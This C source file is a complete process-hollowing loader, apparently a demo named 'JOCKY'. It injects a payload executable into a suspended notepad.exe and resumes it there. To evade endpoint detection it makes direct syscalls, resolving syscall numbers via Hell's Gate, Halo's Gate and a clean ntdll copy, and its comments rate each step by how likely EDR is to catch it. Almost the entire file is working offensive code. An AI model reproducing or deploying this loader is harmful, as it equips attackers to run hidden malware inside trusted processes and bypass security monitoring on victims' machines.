#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>

// ─────────────────────────────────────────────
// SSN Resolution (Hell's Gate → Halo's Gate → Fresh Copy)
// ─────────────────────────────────────────────

DWORD GetSSN_HellsGate(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;

    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, functionName);
    if (!pFunc) return -1;

    if (pFunc[0] == 0xE9) return -1;  // hooked

    if (pFunc[3] == 0xB8)
        return *(DWORD*)(pFunc + 4);

    return -1;
}

DWORD GetSSN_HalosGate(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, functionName);
    if (!pFunc) return -1;

    if (pFunc[3] == 0xB8)
        return *(DWORD*)(pFunc + 4);

    for (int i = 1; i < 10; i++) {
        BYTE* fwd = pFunc + (i * 32);
        if (fwd[3] == 0xB8) return *(DWORD*)(fwd + 4) - i;

        BYTE* bwd = pFunc - (i * 32);
        if (bwd[3] == 0xB8) return *(DWORD*)(bwd + 4) + i;
    }

    return -1;
}

DWORD GetSSN_FreshCopy(LPCSTR functionName) {
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMapping = CreateFileMappingA(
        hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL
    );
    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(
        (BYTE*)pMapping + pDos->e_lfanew
    );
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)pMapping +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD* pNames    = (DWORD*)((BYTE*)pMapping + pExport->AddressOfNames);
    WORD*  pOrdinals = (WORD*) ((BYTE*)pMapping + pExport->AddressOfNameOrdinals);
    DWORD* pFuncs    = (DWORD*)((BYTE*)pMapping + pExport->AddressOfFunctions);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        LPCSTR name = (LPCSTR)((BYTE*)pMapping + pNames[i]);
        if (strcmp(name, functionName) == 0) {
            BYTE* pFunc = (BYTE*)pMapping + pFuncs[pOrdinals[i]];
            if (pFunc[3] == 0xB8) {
                DWORD ssn = *(DWORD*)(pFunc + 4);
                UnmapViewOfFile(pMapping);
                CloseHandle(hMapping);
                CloseHandle(hFile);
                return ssn;
            }
        }
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return -1;
}

DWORD ResolveSSN(LPCSTR functionName) {
    DWORD ssn = GetSSN_HellsGate(functionName);
    if (ssn != -1) return ssn;

    ssn = GetSSN_HalosGate(functionName);
    if (ssn != -1) return ssn;

    return GetSSN_FreshCopy(functionName);
}

// ─────────────────────────────────────────────
// Assembly stub — syscall_stub.asm
// Build with MASM (enable in VS: Build Customizations → masm)
// ─────────────────────────────────────────────
// .code
// DirectSyscall PROC
//     mov r10, rdx
//     mov eax, ecx
//     mov rcx, r8
//     mov rdx, r9
//     syscall
//     ret
// DirectSyscall ENDP
// end
extern "C" NTSTATUS DirectSyscall(DWORD ssn, ...);

// ─────────────────────────────────────────────
// Syscall wrappers — typed so call sites are clean
// ─────────────────────────────────────────────

NTSTATUS Syscall_NtGetContextThread(HANDLE hThread, PCONTEXT ctx) {
    DWORD ssn = ResolveSSN("NtGetContextThread");
    return DirectSyscall(ssn, hThread, ctx);
}

NTSTATUS Syscall_NtUnmapViewOfSection(HANDLE hProcess, PVOID baseAddress) {
    DWORD ssn = ResolveSSN("NtUnmapViewOfSection");
    return DirectSyscall(ssn, hProcess, baseAddress);
}

NTSTATUS Syscall_NtAllocateVirtualMemory(
    HANDLE hProcess,
    PVOID* baseAddress,
    ULONG_PTR zeroBits,
    PSIZE_T regionSize,
    ULONG allocType,
    ULONG protect
) {
    DWORD ssn = ResolveSSN("NtAllocateVirtualMemory");
    return DirectSyscall(ssn,
        hProcess, baseAddress, zeroBits,
        regionSize, allocType, protect
    );
}

NTSTATUS Syscall_NtWriteVirtualMemory(
    HANDLE hProcess,
    PVOID baseAddress,
    PVOID buffer,
    SIZE_T size,
    PSIZE_T bytesWritten
) {
    DWORD ssn = ResolveSSN("NtWriteVirtualMemory");
    return DirectSyscall(ssn,
        hProcess, baseAddress, buffer, size, bytesWritten
    );
}

NTSTATUS Syscall_NtSetContextThread(HANDLE hThread, PCONTEXT ctx) {
    DWORD ssn = ResolveSSN("NtSetContextThread");
    return DirectSyscall(ssn, hThread, ctx);
}

NTSTATUS Syscall_NtResumeThread(HANDLE hThread, PULONG suspendCount) {
    DWORD ssn = ResolveSSN("NtResumeThread");
    return DirectSyscall(ssn, hThread, suspendCount);
}

// ─────────────────────────────────────────────
// Step 0: Read payload.exe from disk — unchanged
// ─────────────────────────────────────────────
LPBYTE ReadPayloadFromDisk(const char* path, DWORD* outSize) {
    HANDLE hFile = CreateFileA(
        path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open payload file: %d\n", GetLastError());
        return NULL;
    }
    *outSize = GetFileSize(hFile, NULL);
    LPBYTE buffer = (LPBYTE)malloc(*outSize);
    DWORD bytesRead = 0;
    ReadFile(hFile, buffer, *outSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[+] Payload read from disk: %d bytes\n", *outSize);
    return buffer;
}

// ─────────────────────────────────────────────
// Relocation processing — unchanged
// ─────────────────────────────────────────────
void ApplyRelocations(
    HANDLE hProcess,
    LPBYTE localPayload,
    LPVOID remoteBase,
    ULONGLONG delta
) {
    if (delta == 0) {
        printf("[+] No relocations needed\n");
        return;
    }
    printf("[*] Applying relocations, delta: 0x%llX\n", delta);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)localPayload;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(localPayload + dos->e_lfanew);

    IMAGE_DATA_DIRECTORY relocDir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (relocDir.VirtualAddress == 0) {
        printf("[*] No relocation table (fixed binary)\n");
        return;
    }

    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(localPayload + relocDir.VirtualAddress);
    DWORD processed = 0;

    while (processed < relocDir.Size) {
        DWORD blockSize = reloc->SizeOfBlock;
        if (blockSize == 0) break;

        DWORD numEntries =
            (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD entries =
            (PWORD)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < numEntries; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG remoteAddr =
                    (ULONGLONG)remoteBase + reloc->VirtualAddress + offset;

                ULONGLONG currentValue = 0;
                ReadProcessMemory(
                    hProcess, (LPVOID)remoteAddr,
                    &currentValue, sizeof(ULONGLONG), NULL
                );

                ULONGLONG newValue = currentValue + delta;
                WriteProcessMemory(
                    hProcess, (LPVOID)remoteAddr,
                    &newValue, sizeof(ULONGLONG), NULL
                );
            }
        }

        processed += blockSize;
        reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + blockSize);
    }
    printf("[+] Relocations applied\n");
}

// ─────────────────────────────────────────────
// Main hollowing logic — direct syscall edition
// ─────────────────────────────────────────────
int main() {
    printf("╔══════════════════════════════════════╗\n");
    printf("║   JOCKY Process Hollowing Demo       ║\n");
    printf("║   Target: notepad.exe                ║\n");
    printf("║   Mode:   Direct Syscalls            ║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    // ── 0. Read payload ────────────────────────────────────────────────
    DWORD payloadSize = 0;
    LPBYTE payload = ReadPayloadFromDisk("payload.exe", &payloadSize);
    if (!payload) return 1;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Not a valid PE\n");
        return 1;
    }

    PIMAGE_NT_HEADERS ntHeaders =
        (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature\n");
        return 1;
    }

    printf("[+] Payload PE verified\n");
    printf("[+] Preferred base:  0x%llX\n",
           (ULONGLONG)ntHeaders->OptionalHeader.ImageBase);
    printf("[+] Image size:      0x%X\n",
           ntHeaders->OptionalHeader.SizeOfImage);
    printf("[+] Entry point RVA: 0x%X\n\n",
           ntHeaders->OptionalHeader.AddressOfEntryPoint);

    // ── 1. Launch notepad suspended — WinAPI (not a hot EDR target) ───
    printf("[*] Launching notepad.exe suspended...\n");

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi
    )) {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    printf("[+] PID: %d | TID: %d\n\n", pi.dwProcessId, pi.dwThreadId);

    // ── 2. Get thread context — DIRECT SYSCALL ─────────────────────────
    printf("[*] Reading thread context via NtGetContextThread...\n");

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    NTSTATUS status = Syscall_NtGetContextThread(pi.hThread, &ctx);
    if (status != 0) {
        printf("[-] NtGetContextThread failed: 0x%X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Thread context obtained\n");
    printf("[+] RIP: 0x%llX\n\n", ctx.Rip);

    // ── 3. Find PEB and notepad image base — WinAPI (read only, low risk)
    printf("[*] Locating PEB...\n");

    typedef NTSTATUS(NTAPI* NtQueryProcessInfo_t)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
    );
    NtQueryProcessInfo_t NtQPI = (NtQueryProcessInfo_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"
    );

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLen = 0;
    NtQPI(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLen);

    LPVOID pebAddress = pbi.PebBaseAddress;
    printf("[+] PEB: 0x%p\n", pebAddress);

    LPVOID notepadImageBase = NULL;
    ReadProcessMemory(
        pi.hProcess,
        (LPBYTE)pebAddress + 0x10,
        &notepadImageBase,
        sizeof(LPVOID), NULL
    );
    printf("[+] Notepad image base: 0x%p\n\n", notepadImageBase);

    // ── 4. Unmap notepad — DIRECT SYSCALL ─────────────────────────────
    printf("[*] Unmapping notepad via NtUnmapViewOfSection...\n");

    status = Syscall_NtUnmapViewOfSection(pi.hProcess, notepadImageBase);
    if (status != 0) {
        printf("[-] NtUnmapViewOfSection failed: 0x%X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Notepad unmapped — process is hollow\n\n");

    // ── 5. Allocate memory — DIRECT SYSCALL ───────────────────────────
    printf("[*] Allocating via NtAllocateVirtualMemory...\n");

    PVOID allocBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

    status = Syscall_NtAllocateVirtualMemory(
        pi.hProcess,
        &allocBase,
        0,
        &imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status != 0) {
        // Preferred base unavailable — let OS choose
        printf("[*] Preferred base busy, letting OS assign...\n");
        allocBase = NULL;
        imageSize = ntHeaders->OptionalHeader.SizeOfImage;

        status = Syscall_NtAllocateVirtualMemory(
            pi.hProcess,
            &allocBase,
            0,
            &imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Allocated at: 0x%p\n\n", allocBase);

    // ── 6. Write PE headers — DIRECT SYSCALL ──────────────────────────
    printf("[*] Writing payload via NtWriteVirtualMemory...\n");

    SIZE_T bytesWritten = 0;

    status = Syscall_NtWriteVirtualMemory(
        pi.hProcess,
        allocBase,
        payload,
        ntHeaders->OptionalHeader.SizeOfHeaders,
        &bytesWritten
    );
    printf("[+] PE headers written (%llu bytes)\n", bytesWritten);

    // ── 7. Write sections — DIRECT SYSCALL ────────────────────────────
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section->SizeOfRawData == 0) { section++; continue; }

        PVOID dest = (PBYTE)allocBase + section->VirtualAddress;

        status = Syscall_NtWriteVirtualMemory(
            pi.hProcess,
            dest,
            payload + section->PointerToRawData,
            section->SizeOfRawData,
            &bytesWritten
        );

        printf("[+] Section %-8.8s | RVA: 0x%08X | %llu bytes written\n",
               section->Name, section->VirtualAddress, bytesWritten);

        section++;
    }

    // ── 8. Apply relocations — unchanged ──────────────────────────────
    ULONGLONG delta =
        (ULONGLONG)allocBase - ntHeaders->OptionalHeader.ImageBase;
    ApplyRelocations(pi.hProcess, payload, allocBase, delta);

    // ── 9. Update PEB ImageBase — WinAPI write (low risk) ─────────────
    WriteProcessMemory(
        pi.hProcess,
        (LPBYTE)pebAddress + 0x10,
        &allocBase,
        sizeof(PVOID), NULL
    );
    printf("[+] PEB ImageBase updated\n");

    // ── 10. Redirect execution — DIRECT SYSCALL ───────────────────────
    printf("\n[*] Redirecting RCX to payload entry via NtSetContextThread...\n");

    ULONGLONG newEntry =
        (ULONGLONG)allocBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    ctx.Rcx = newEntry;

    status = Syscall_NtSetContextThread(pi.hThread, &ctx);
    if (status != 0) {
        printf("[-] NtSetContextThread failed: 0x%X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Entry point set: 0x%llX\n", newEntry);

    // ── 11. Resume — DIRECT SYSCALL ───────────────────────────────────
    printf("\n[*] Resuming via NtResumeThread...\n");

    ULONG suspendCount = 0;
    status = Syscall_NtResumeThread(pi.hThread, &suspendCount);
    if (status != 0) {
        printf("[-] NtResumeThread failed: 0x%X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║  HOLLOWING COMPLETE — Direct Syscall Edition     ║\n");
    printf("║  JOCKY payload running inside notepad.exe        ║\n");
    printf("║  PID: %-5d                                      ║\n", pi.dwProcessId);
    printf("╚══════════════════════════════════════════════════╝\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(payload);
    return 0;
}